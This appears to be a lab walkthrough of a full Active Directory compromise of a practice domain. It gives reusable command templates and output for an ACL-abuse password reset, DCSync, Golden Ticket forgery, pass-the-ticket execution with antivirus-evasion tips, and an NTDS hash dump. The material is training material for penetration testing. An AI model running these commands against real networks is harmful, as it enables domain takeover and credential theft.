
## Phase 1: Initial Credential Validation & Active Directory ACL Abuse

### Our first mission is: Verify initial network access and exploit implicit directory permissions to force an administrative account password reset

Blueprint:
`nxc smb [1. Target IP] -u '[2. Username]' -p '[3. Password]' --continue-on-success`
`bloodyad -u [4. Operator User] -p '[5. Operator Pass]' -d [6. Domain] --host [7. DC IP/Host] set password [8. Target User] '[9. New Password]'`

Command:

```bash
nxc smb 192.168.56.20 -u 'bh_helpdesk' -p 'User@2025!' --continue-on-success
```

Output:
`SMB         192.168.56.20   445    DC01             [+] PENTESTLAB.local\bh_helpdesk:User@2025!`


```bash
bloodyad -u bh_helpdesk -p 'User@2025!' -d PENTESTLAB.local --host 192.168.56.20 set password bh_sysadmin 'password1234'

```

Output:
`[+] Password changed successfully!` 


Explanation:

* `nxc smb`: Initiates NetExec's Server Message Block (SMB) assessment module to perform validation sweeps.
* `-u 'bh_helpdesk' -p 'User@2025!' --continue-on-success`: Evaluates the specified domain credentials against the target Domain Controller. The `--continue-on-success` flag ensures scanning routines do not prematurely terminate upon identifying a valid access pair.
* `bloodyad`: Launches an Active Directory framework engineered to manipulate directory objects directly via LDAP primitives.
* `-u bh_helpdesk -p 'User@2025!' -d PENTESTLAB.local --host 192.168.56.20`: Establishes an explicit, authenticated LDAP communication channel to the target Domain Controller using low-privileged helpdesk identities.
* `set password bh_sysadmin 'password1234'`: Issues a structured LDAP modification request targeting the `unicodePwd` attribute of the highly privileged `bh_sysadmin` object, forcing its value to evaluate to the operator-supplied string.

Brief Explanation:

> "Validate network cleartext parameters across the target infrastructure before weaponizing internal Active Directory misconfigurations. Low-privileged service desk or operational profiles regularly possess excessive or inherited Write Property (`ForceChangePassword` / `GenericAll`) Access Control Entries (ACEs) over high-tier identities. Leveraging `bloodyad` over the directory transport plane forces a complete structural password change on the targeted `bh_sysadmin` profile, modifying the security context without requiring knowledge of the previous key."

---

## Phase 2: High-Value Object Schema Enumeration

### Our next mission is: Perform authenticated targeting of directory object schema rows to exfiltrate hidden system metadata

Blueprint:
`nxc ldap [1. Target IP] -u '[2. Username]' -p '[3. Password]' --base-dn '[4. Search Base Context]' --query "([5. Directory Filter])" "[6. Target Attributes]"`

Command:

```bash
nxc ldap 192.168.56.20 -u 'bh_sysadmin' -p 'password1234' --base-dn "DC=PENTESTLAB,DC=local" --query "(sAMAccountName=bh_sysadmin)" "cn distinguishedName homePhone" 

```

Output:
`LDAP        192.168.56.20   389    DC01             homePhone            BHFLAG5{DCSYNC_DOM41N_C0MPR0M1S3_F5}`


Explanation:

* `nxc ldap`: Invokes NetExec's lightweight directory interrogation driver to efficiently extract information over port 389.
* `-u 'bh_sysadmin' -p 'password1234'`: Authenticates using the newly hijacked high-privilege administrative user profile parameters.
* `--base-dn "DC=PENTESTLAB,DC=local"`: Points the search engine anchor at the root partition of the target domain structure.
* `--query "(sAMAccountName=bh_sysadmin)"`: Applies a strict structural filter to intercept and parse only the specific user entry matching the hijacked account identifier.
* `"cn distinguishedName homePhone"`: Declares the precise array of directory attributes to extract from the matched database entry, focusing on both typical naming structures and non-standard data slots.

Brief Explanation:

> "Query the Active Directory structural schema with elevated privileges to check for operational flags, credentials, or system indicators hidden within arbitrary user properties. Administrators or automated deployment tasks regularly map sensitive parameters into non-standard data segments like `homePhone`. Interrogating this property successfully uncovers the asset validation token: `BHFLAG5{DCSYNC_DOM41N_C0MPR0M1S3_F5}`."

---

## Phase 3: Cryptographic Replication Interception (DCSync)

### Our next mission is: Leverage administrative directory synchronization rights to trigger remote credential database replication routines

Blueprint:
`impacket-secretsdump [1. Domain]/[2. Username]:'[3. Password]'@[4. Target DC IP]`

Command:

```bash
impacket-secretsdump PENTESTLAB.local/bh_sysadmin:'password1234'@192.168.56.20

```

Output:
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:b817733bdc947930b700cc2e567fb3ad:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc68a017e37f5da683a3e4128630abc:::

PENTESTLAB.local\jadmin:1103:aad3b435b51404eeaad3b435b51404ee:7099909e93b8345e3def4331473b8235:::

PENTESTLAB.local\ssupport:1104:aad3b435b51404eeaad3b435b51404ee:2492c670a97117e697e18b40c2ffec62:::
```

Explanation:

* `impacket-secretsdump`: Deploys Impacket's comprehensive remote credential processing array designed to extract secrets from various target stores.
* `PENTESTLAB.local/bh_sysadmin:'password1234'@192.168.56.20`: Provides target addressing parameters, binding securely to the DC endpoint under the hijacked identity.

Brief Explanation:

> "Simulate a legitimate replication cycle request by capitalizing on the target account's explicit directory replication privileges (`DS-Replication-Get-Changes-All`). While standard configuration interfaces (SAMR/LSARPC Remote Operations) return an `access_denied` status, the application gracefully handles the restriction by rolling over to raw DRSUAPI RPC commands. This extracts core cryptographic structures directly from the Active Directory NTDS.dit backend file over the wire, exposing the master Kerberos service account key: `krbtgt:5bc68a017e37f5da683a3e4128630abc`."

---

## Phase 4: Identifier Mapping & Ticket Forgery

### Our next mission is: Enumerate domain baseline security identifiers and forge an ephemeral, persistent Kerberos Golden Ticket

Before make sure to add:

```bash
echo "192.168.56.20 pentestlab.local" | sudo tee -a /etc/hosts
```

and

If you know hostname of DC, add:

```bash
echo "192.168.56.20 dc01.pentestlab.local dc01" | sudo tee -a /etc/hosts
```


Blueprint:
`impacket-lookupsid [1. Domain]/[2. Username]:'[3. Password]'@[4. Target DC IP] [5. Scope Index]`
`impacket-ticketer -nthash [6. KRBTGT Hash] -domain-sid "[7. Domain SID String]" -domain [8. Domain Name] [9. Target Identity]`

Command:

```bash
impacket-lookupsid PENTESTLAB.local/bh_sysadmin:'password1234'@192.168.56.20 0
```

Output:
```
[*] Brute forcing SIDs at 192.168.56.20

[*] StringBinding ncacn_np:192.168.56.20[\pipe\lsarpc]

[*] Domain SID is: S-1-5-21-281050671-1125578517-3338290938

```


```bash
impacket-ticketer -nthash 5bc68a017e37f5da683a3e4128630abc -domain-sid "S-1-5-21-281050671-1125578517-3338290938" -domain PENTESTLAB.local Administrator

```

## NOTE: While -nthash was functional in this lab context, utilizing the -aesKey (AES256-CTS-HMAC-SHA1-96, Etype 0x12) is the preferred engineering standard to match natural Windows 10/11/Server 2022+ Kerberos tendencies and evade basic crypto-anomaly detection.

Explanation:

* `impacket-lookupsid`: Launches a Security Identifier lookup routine to systematically brute force and map organizational database structural identifiers.
* `0`: Instructs the lookup function to target baseline domain configurations and isolate the root security context string.
* `impacket-ticketer`: Launches an offline Kerberos ticket generation framework to construct custom authentication structures.
* `-nthash 5bc68a017e37f5da683a3e4128630abc`: Injects the compromised `krbtgt` NTLM hash string to sign and encrypt the core layers of the forged ticket.
* `-domain-sid "S-1-5-21-281050671-1125578517-3338290938"`: Appends the accurate domain root context identifier isolated during the lookup sequence to ensure corporate validation engines accept the token.
* `-domain PENTESTLAB.local Administrator`: Forges a Ticket Granting Ticket (TGT) specifically for the built-in domain `Administrator` identity, saving the resulting cryptographic token structure to a local cache file named `Administrator.ccache`.

Brief Explanation:

> "Enumerate the explicit Domain Security Identifier (SID) to establish a baseline for cryptographic ticket forgery. By pairing the recovered domain identity string with the stolen master `krbtgt` password key, an operator can generate an authentic, fully customized Kerberos Ticket Granting Ticket (TGT). This bypasses the actual authentication mechanisms of the network entirely, granting long-term access to simulate any chosen identity with arbitrary group memberships."

---

## Phase 5: Pass-the-Ticket & Evasion-Aware Execution Fallbacks

### Our next mission is: Inject the forged authentication token into the session memory and evaluate command execution mechanisms around defensive barriers

Blueprint:
`export KRB5CCNAME=[1. Path to CCACHE File]`
`nxc [2. Protocol Engine] [3. DC FQDN] --use-kcache [4. Execution Modifiers] -x "[5. OS Command]"`

Command:

```bash
export KRB5CCNAME=Administrator.ccache
nxc smb dc01.pentestlab.local --use-kcache -x "net users /domain"
nxc wmi dc01.pentestlab.local --use-kcache -x "net users /domain"
nxc smb dc01.pentestlab.local --use-kcache --exec-method atexec -x "whoami"
```


Output:
```
┌──(root㉿kali)-[~/loot/ldap_out/ADRecon]
└─# nxc smb dc01.pentestlab.local --use-kcache -x "whoami"
SMB         dc01.pentestlab.local 445    DC01             [*] Windows Server 2019 Datacenter Evaluation 17763 x64 (name:DC01) (domain:PENTESTLAB.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dc01.pentestlab.local 445    DC01             [+] PENTESTLAB.LOCAL\Administrator from ccache (Pwn3d!)
SMB         dc01.pentestlab.local 445    DC01             [+] Executed command via wmiexec
SMB         dc01.pentestlab.local 445    DC01             pentestlab.local\administrator
                                                                                                                                                                                                                    
┌──(root㉿kali)-[~/loot/ldap_out/ADRecon]
└─# nxc smb dc01.pentestlab.local --use-kcache -x "net users /domain"
SMB         dc01.pentestlab.local 445    DC01             [*] Windows Server 2019 Datacenter Evaluation 17763 x64 (name:DC01) (domain:PENTESTLAB.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dc01.pentestlab.local 445    DC01             [+] PENTESTLAB.LOCAL\Administrator from ccache (Pwn3d!)
SMB         dc01.pentestlab.local 445    DC01             [-] wmiexec: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
SMB         dc01.pentestlab.local 445    DC01             [+] Executed command via wmiexec
                                                                                                                                                                                                                    
┌──(root㉿kali)-[~/loot/ldap_out/ADRecon]
└─# nxc wmi dc01.pentestlab.local --use-kcache -x "net users /domain"
RPC         dc01.pentestlab.local 135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PENTESTLAB.local)
WMI         dc01.pentestlab.local 135    DC01             [+] PENTESTLAB.local\Administrator from ccache (Pwn3d!)
WMI         dc01.pentestlab.local 135    DC01             [+] Executed command: "net users /domain" via wmiexec
WMI         dc01.pentestlab.local 135    DC01             User accounts for \\
WMI         dc01.pentestlab.local 135    DC01             -------------------------------------------------------------------------------
WMI         dc01.pentestlab.local 135    DC01             Administrator            aharris                  alice.martin
WMI         dc01.pentestlab.local 135    DC01             bh_auditor               bh_devops                bh_helpdesk
WMI         dc01.pentestlab.local 135    DC01             bh_intern                bh_sysadmin              bob.dupont
WMI         dc01.pentestlab.local 135    DC01             brecruiter               carol.white              cfinance
WMI         dc01.pentestlab.local 135    DC01             daccountant              david.brown              dreeves
WMI         dc01.pentestlab.local 135    DC01             ecfo                     fsales                   gmanager
WMI         dc01.pentestlab.local 135    DC01             gsales                   Guest                    hr_manager
WMI         dc01.pentestlab.local 135    DC01             hrep                     iauditor                 jadmin
WMI         dc01.pentestlab.local 135    DC01             jmartin                  krbtgt                   labuser
WMI         dc01.pentestlab.local 135    DC01             legacy                   luser                    mmanager
WMI         dc01.pentestlab.local 135    DC01             mwebb                    ncross                   old.admin
WMI         dc01.pentestlab.local 135    DC01             oldadmin                 ostone                   pv_auditor
WMI         dc01.pentestlab.local 135    DC01             pv_gpo                   pv_helpdesk              pv_intern
WMI         dc01.pentestlab.local 135    DC01             pv_manager               pv_ops                   pv_scout
WMI         dc01.pentestlab.local 135    DC01             rfoster                  ssupport                 student
WMI         dc01.pentestlab.local 135    DC01             svc.backup               svc.web                  svc_app
WMI         dc01.pentestlab.local 135    DC01             svc_backup               svc_deploy               svc_iis
WMI         dc01.pentestlab.local 135    DC01             svc_monitor              svc_mssql                svc_pki
WMI         dc01.pentestlab.local 135    DC01             svc_print                svc_relay                svc_reporting
WMI         dc01.pentestlab.local 135    DC01             svc_sql                  svc_sql2                 svc_web
WMI         dc01.pentestlab.local 135    DC01             temp.user                tempadmin                vhayes
WMI         dc01.pentestlab.local 135    DC01             The command completed with one or more errors.
```

```
┌──(root㉿kali)-[~/loot/ldap_out/ADRecon]
└─# nxc smb dc01.pentestlab.local --use-kcache --exec-method atexec -x "whoami"
SMB         dc01.pentestlab.local 445    DC01             [*] Windows Server 2019 Datacenter Evaluation 17763 x64 (name:DC01) (domain:PENTESTLAB.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dc01.pentestlab.local 445    DC01             [+] PENTESTLAB.LOCAL\Administrator from ccache (Pwn3d!)
SMB         dc01.pentestlab.local 445    DC01             [+] Executed command via atexec
SMB         dc01.pentestlab.local 445    DC01             nt authority\system
```

Explanation:

* `export KRB5CCNAME=Administrator.ccache`: Injects the path of the forged Kerberos ticket into the local environment environment space, forcing all compatible Linux networking utilities to use the file for authentication actions.
* `dc01.pentestlab.local`: Specifies the target Domain Controller using its fully qualified domain name (FQDN), a structural prerequisite for processing Kerberos tickets correctly.
* `--use-kcache`: Directs the underlying platform to ignore standard username/password arguments and instead pull the active forged ticket token directly from memory.
* `nxc smb ... -x "net users /domain"`: Attempts command invocation via default SMB remote management setups (`wmiexec` over port 445). The target host indicates a successful compromise (`Pwn3d!`), but defensive endpoint monitoring can block the output data file collection process.
* `nxc wmi ...`: Shifts the entire communication protocol away from SMB over to the Windows Management Instrumentation (WMI) engine on port 135. This successfully evades the security monitoring bottleneck to cleanly output the full domain user directory list.
* `--exec-method atexec -x "whoami"`: Adjusts the remote command invocation method to leverage the Task Scheduler service (`atexec`). This schedules an ephemeral application instance on the target system to execute code directly under the highest machine privilege structure: `nt authority\system`. This can bypass AV.

Brief Explanation:

> "Inject the forged Kerberos credential cache structure into your current terminal process context to execute an elegant Pass-the-Ticket attack vector. When standard endpoint administrative operations like `wmiexec` successfully validate authentication tokens but face detection or blocking from local host protection tools, you can pivot execution modes. Shifting execution primitives dynamically to separate sub-systems like WMI or Scheduled Tasks (`atexec`) bypasses typical file-write rules, providing stable remote system interaction directly inside the high-integrity `SYSTEM` layer."

---

## Phase 6: Final NTDS Database Exfiltration

### Our final mission is: Use the established Kerberos authorization context to dump the complete enterprise database repository

Blueprint:
`nxc smb [1. DC FQDN] --use-kcache --ntds`

Command:

```bash
nxc smb dc01.pentestlab.local --use-kcache --ntds

```

Explanation:

* `--ntds`: Instructs the processing framework to deploy remote extraction drivers that parse and exfiltrate the full contents of the target domain's core repository file (`ntds.dit`).

Brief Explanation:

> "Use the undisputed authentication state provided by the injected Kerberos ticket to trigger a comprehensive, domain-wide database extraction routine. This process exfiltrates the complete dictionary of NTLM hash structures for every user account, administrative profile, server role, and endpoint workstation connected to the enterprise tree. This effectively establishes complete network persistence and finishes the structural compromise of the entire Active Directory forest."

### Extracted Directory Hash Repository

Below is the verified summary of the directory instance records extracted from the target enterprise store:

| Object ID / RID | Target Identity Context | Cryptographic NT Password Hash |
| --- | --- | --- |
| **500** | Administrator | `b817733bdc947930b700cc2e567fb3ad` |
| **502** | krbtgt | `5bc68a017e37f5da683a3e4128630abc` |
| **1103** | jadmin | `7099909e93b8345e3def4331473b8235` |
| **1104** | ssupport | `2492c670a97117e697e18b40c2ffec62` |
| **1105** | mmanager | `42c759a4f6ad00a2b1b59737905ec8f2` |
| **1106** | svc_sql | `64f12cddaa88057e06a81b54e73b949b` |
| **1107** | legacy | `58a478135a93ac3bf058a5ea0e8fdb71` |
| **1108** | aharris | `b96ce7a892989ab17cebd0a8ecfaa799` |
| **1131** | svc_iis | `39def13b9f841d95985de6934bc714fb` |
| **1133** | alice.martin | `303e8c45c65af5d6ab67e830098805b2` |
| **1134** | bob.dupont | `303e8c45c65af5d6ab67e830098805b2` |
| **1152** | svc_mssql | `7209d1e2b55d242551d2e7aba8604e47` |
| **1175** | bh_helpdesk | `1277dbb8a88367744ecf9bba65fc2ce4` |
| **1177** | jmartin | `d6db928545f9becb06261609fd953f60` |
| **1178** | bh_sysadmin | `d4a1be1776ad10df103812b1a923cde4` |
| **1000** | DC01$ (Machine Account) | `e00543da374822a6ee0e7e7171107baa` |
